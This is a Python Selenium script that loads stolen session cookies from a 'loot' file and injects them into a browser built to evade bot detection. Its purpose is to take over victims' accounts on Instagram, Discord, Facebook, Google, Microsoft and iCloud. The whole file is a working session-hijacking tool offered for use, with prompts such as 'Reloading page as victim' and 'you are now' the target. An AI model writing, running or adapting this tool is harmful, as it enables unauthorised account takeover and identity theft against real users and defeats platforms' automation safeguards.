import os
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium_stealth import stealth
import undetected_chromedriver as uc

# Constants
LOOT_FILE = "loot/stolen_tokens.txt"
TARGET_SITES = {
    "1": ("Instagram", "https://www.instagram.com"),
    "2": ("Discord", "https://discord.com"),
    "3": ("Facebook", "https://www.facebook.com"),
    "4": ("Google", "https://www.google.com"),
    "5": ("Microsoft", "https://www.microsoft.com"),
    "6": ("iCloud", "https://www.icloud.com"),
}

def configure_driver(headless=False):
    options = uc.ChromeOptions()
    options.headless = headless
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
    
    driver = uc.Chrome(options=options)
    stealth(driver, languages=["en-US", "en"], vendor="Google Inc.", platform="Win32", webgl_vendor="Intel Inc.", renderer="Intel Iris OpenGL", fix_hairline=True)
    return driver

def choose_target():
    print("\n[🎯] Choose a target to inject:")
    for key, (name, _) in TARGET_SITES.items():
        print(f"[{key}] {name}")
    choice = input("Your choice: ").strip()
    return TARGET_SITES.get(choice)

def load_cookies_for_domain(domain):
    if not os.path.exists(LOOT_FILE):
        print("[!] No loot file found.")
        return []

    with open(LOOT_FILE, "r") as f:
        return [
            {"domain": parts[0], "name": parts[1], "value": parts[2]}
            for line in f.readlines()
            if domain in line and (parts := line.strip().split("\t")) and len(parts) == 3
        ]

def inject_cookies(driver, cookies, domain):
    driver.delete_all_cookies()
    for cookie in cookies:
        try:
            driver.add_cookie({
                "name": cookie["name"],
                "value": cookie["value"],
                "domain": "." + domain,
                "path": "/"
            })
            print(f"[+] Injected cookie: {cookie['name']}")
        except Exception as e:
            print(f"[!] Error injecting cookie {cookie['name']}: {e}")

def run():
    target = choose_target()
    if not target:
        print("[!] Invalid choice.")
        return

    name, url = target
    domain = url.replace("https://", "").replace("www.", "").strip("/")

    print(f"\n[🧪] Launching browser for: {name}")
    cookies = load_cookies_for_domain(domain)
    if not cookies:
        print("[!] No cookies found for this domain.")
        return

    driver = configure_driver(headless=False)
    driver.get(url)
    time.sleep(3)
    inject_cookies(driver, cookies, domain)

    print("\n[💉] Session cookies injected. Reloading page as victim...")
    driver.get(url)

    print(f"[✅] If the cookies were valid, you are now {name}.")
    input("Press ENTER to close the browser...")
    driver.quit()

if __name__ == "__main__":
    run()
